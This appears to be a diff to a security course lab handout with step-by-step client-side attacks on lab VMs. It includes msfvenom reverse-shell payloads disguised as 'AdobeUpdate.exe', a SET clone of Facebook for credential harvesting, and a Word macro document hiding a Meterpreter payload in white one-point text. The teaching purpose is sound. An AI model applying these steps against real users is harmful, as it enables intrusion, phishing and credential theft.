@@ -14,10 +14,10 @@ In this section, you’ll use msfvenom to perform a client-side attack. Msfvenom
 
 1.	Open your Kali Linux and Windows 10 VMs. Make sure that both are on the same subnet and can ping each other.
 2.	On Windows, make sure Windows Defender is turned off. Run:
-    
-        c:\control /name Microsoft.WindowsDefender
+	* click the windows button on the bottom left of the desktop and searching for 'Defender' and choose 'Windows Defender Security Center'
+	* click 'Virus & Threat protection settings'
+	* move the 'Real-time protection' slider to the left.
 
-3.	Click “settings,” and make sure that real-time protection is turned off.
 4.	In Kali, type `msfvenom --help-formats` to see a list of output formats that msfvenom supports. We’ll use the `-f exe` option to create a Windows executable.
 5.	In Kali, run the following command, all on one line:
 
@@ -31,7 +31,7 @@ In this section, you’ll use msfvenom to perform a client-side attack. Msfvenom
     * `LPORT` 	The listening port on your Kali Linux VM
 
 6.	Verify that the output file is about 73802 bytes in size. If not, you may need to check that you entered the command correctly and run it again.
-7.	Now, set up a web server to host your malicious file. Change directories to /tmp by entering cd /tmp.
+7.	Now, set up a web server to host your malicious file. Change directories to /tmp by entering `cd /tmp`.
 8.	Run this command:
 
         python -m SimpleHTTPServer 8888
@@ -51,7 +51,10 @@ In this section, you’ll use msfvenom to perform a client-side attack. Msfvenom
     **Note:** Set the port to `8080` (the port your malicious executable will use to connect back to your Kali VM), not `8888` (the port of your Python web server on Kali).
     
 15.	Enter `exploit -j`. The `-j` option jobifies the exploit, or runs it as a job in the background. You can see a list of jobs running in the background by using the command jobs.
-16.	On your Windows 10 VM, in a web browser, download the `AdobeUpdate.exe` file from the Python webserver and run the executable. If a warning appears saying that Windows couldn’t access Windows SmartScreen, click “Run anyway.” For the warning, “Do you want to allow this app from an unknown publisher…,” click “Yes.”
+16.	On your Windows 10 VM, in a web browser (**not Chrome, it's too safe**), download the `AdobeUpdate.exe` file from the Python webserver and run the executable. 
+    * If you use Edge/IE browser, download it, click "view downloads", right-click AdobeUpdate.exe, select "Run anyway"
+    * If a warning appears saying that Windows couldn’t access Windows SmartScreen, "more info", then click “Run anyway.” 
+    * For the warning, “Do you want to allow this app from an unknown publisher…,” click “Yes.”
 17.	On your Kali VM, you should see in your msfconsole that “Command shell session X opened),” where X is the number of the new session. Type:
 
         sessions -i [the number of the new session]
@@ -74,7 +77,7 @@ Get the latest version of SET by entering the following commands in the Kali ter
     cd /opt/
     git clone https://github.com/trustedsec/social-engineer-toolkit/  set/
     
-**Note:** There is a space between before the word ‘set/’
+**Note:** There is a space before the word `set/`
 
 Edit `/opt/set/src/core/config.baseline` and scroll to the bottom of the document.  Change `BLEEDING_EDGE=OFF` to `BLEEDING_EDGE=ON`
 
@@ -82,7 +85,7 @@ Edit `/opt/set/src/core/config.baseline` and scroll to the bottom of the documen
 
 Save the file and exit.
 
-1.	Return to the `/opt/set` directory and run the command `./setoolkit` (don’t forget the “./”). Agree to the terms of service. You should see a screen like the following:
+1.	Return to the `/opt/set` directory and run the command `./setoolkit` (don’t forget the `./`). Agree to the terms of service. You should see a screen like the following:
     
     ![](../images/lab_11_2.png){: .img-responsive width='30%'}
 
@@ -98,13 +101,13 @@ Save the file and exit.
 
     ![](../images/lab_11_5.png){: .img-responsive width='30%'}
 
-5.	Select option 2 to clone a target website. This is a very sophisticated feature that can clone almost any website. After you’ve selected this feature, you’ll need to set an IP address to host the cloned site. Set “IP address for the POST back in Harvester/Tabnabbing” to the IP address (previously configured in bridged mode) of Kali Linux.
+5.	Select option 2 to clone a target website. This is a very sophisticated feature that can clone almost any website. After you’ve selected this feature, you’ll need to set an IP address to host the cloned site. Set “IP address for the POST back in Harvester/Tabnabbing” to the IP address of Kali Linux for the host-only network.
 
 Now you get to choose the website to clone. Set the cloned website to `https://www.facebook.com`
 
 If all has gone well, you should see a screen like the following:
 
-    ![](../images/lab_11_6.png){: .img-responsive width='30%'}
+![](../images/lab_11_6.png){: .img-responsive width='30%'}
     
 6.	Now it’s time to script the phishing message to send. At this point, an attacker would use a tool or service to send a spoofed email. For simplicity, skip this step and instead send an email to your own email account with the message:
 
@@ -120,7 +123,7 @@ Use rich text formatting to make `www.facebook.com` a hyperlink that points to `
     
 8.	Enter fake credentials into the fields on the spoofed website. After you’ve filled the fields in with whatever words you wish, press the login button on the website. On your Kali VM, you should see something similar to this in your terminal window:
 
-        Todo: insert screenshot from new SET harvesting output
+    ![](../images/lab_set_facebook.png){: .img-responsive width='50%'}
         
 # Part 3. SET Discovery
 
@@ -136,9 +139,9 @@ In this section, you’ll create a macro enabled Microsoft Word file that opens 
 
 1.	In Kali, run the following command (all one line):
 
-        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=172.16.1.61 LPORT=8080 -e x86/shikata_ga_nai -f vba-exe > /tmp/vb_code.txt
+        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=172.16.1.61 LPORT=8080 -e x86/shikata_ga_nai -f vba-exe
 
-2.	Open the `vb_code.txt` file, copy the code, and paste it into a text file on your Windows VM workstation.
+2.	Read the beginning of the output. It explains that the output is divided into two sections: A "Macro" section and a "Payload" section. Copy _all_ of the output from your terminal from this command, and paste it into a text file on your Windows VM (or onto a machine with Microsoft Word).
 
 3.	In Kali, run msfconsole and run the following commands:
 
@@ -158,15 +161,15 @@ In this section, you’ll create a macro enabled Microsoft Word file that opens 
     
     ![](../images/lab_11_9.png){: .img-responsive width='70%'}
     
-    Inside the visual basic editor, right-click the document, select `Insert > Module`. Open the VB.txt file that you copied over from Kali. Paste in the VB code (**but not the payload**). Save it as a Word macro-enabled document and close the VB editor.
+    Inside the visual basic editor, right-click the document, select `Insert > Module`. Open the text file with the exploit code that you copied over from Kali. Paste in all of the code in the "Macro" section (**but not the payload**) into the Visual Basic module you just inserted. Save it as a Word macro-enabled document and close the VB editor.
     
     ![](../images/lab_11_10.png){: .img-responsive width='70%'}
     
-5. In the main body of the Word document, paste the payload hex code. Above the hex code, type a simple memo as the ostensible content of the memo. Next, highlight the hex code you pasted in and change the font size to “1” and the font color to white. This will make the hex code difficult to find for anyone who opens the document. Finally, save the document as a macro-enabled Word file (with a “.docm” extension). Name the file something like “Sales Memo.”
+5. In the main body of the Word document, paste the payload hex code from the kali output. Above the hex code, type a simple memo as the ostensible content of the memo. Next, highlight the hex code you pasted in and change the font size to “1” and the font color to white. This will make the hex code difficult to find for anyone who opens the document. Finally, save the document as a macro-enabled Word file (with a “.docm” extension). Name the file something like “Sales Memo.”
 
     **Optional:** “In order to keep user suspicion low, try embedding the code in one of the many Word macro games that are available on the Internet. That way, the user is happily playing the game while you are working in the background. This gives you some extra time to migrate to another process if you are using Meterpreter as a payload.” From _Metasploit: The Pentester’s Guide_.
     
-    Test that your malicious Word file by opening it on the Windows 10 VM. If Word asks, enable macro content. In the Kali VM, you should now see that a Meterpreter session has been opened to the host workstation.  If it doesn’t work, make sure that macros are enabled in your Word doc (Developer tab > Macro Security > Enable all macros).
+6. Test that your malicious Word file by opening it on the Windows 10 VM. If Word asks, enable macro content. In the Kali VM, you should now see that a Meterpreter session has been opened to the host workstation.  If it doesn’t work, make sure that macros are enabled in your Word doc (Developer tab > Macro Security > Enable all macros).
     
     **Optional:** Use the sendEmail command on Kali to send a spoofed email with the malicious Word file as an attachment. To see how the sendEmail command works, type `man sendEmail.`
     
